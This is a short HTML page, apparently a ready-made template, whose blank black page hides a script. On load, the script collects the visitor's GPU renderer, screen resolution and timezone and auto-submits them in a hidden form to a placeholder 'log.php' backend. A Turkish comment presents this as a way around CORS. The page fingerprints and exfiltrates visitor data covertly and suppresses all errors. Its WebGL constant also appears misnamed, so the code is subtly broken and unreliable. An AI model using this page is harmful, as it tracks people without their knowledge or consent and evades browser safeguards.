<!DOCTYPE html>
<html>
<head><title> </title></head>
<body style="background:#000;">
    <form id="f" action="https://senin-backend-siten.com/log.php" method="POST">
        <input type="hidden" name="gpu" id="g">
        <input type="hidden" name="res" id="r">
        <input type="hidden" name="tz" id="t">
    </form>
    <script>
        (function() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                document.getElementById('g').value = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                document.getElementById('r').value = screen.width + "x" + screen.height;
                document.getElementById('t').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
                // Formu otomatik g√∂nder (CORS'u bypass etmenin en eski yolu)
                document.getElementById('f').submit();
            } catch(e) {}
        })();
    </script>
</body>
</html>
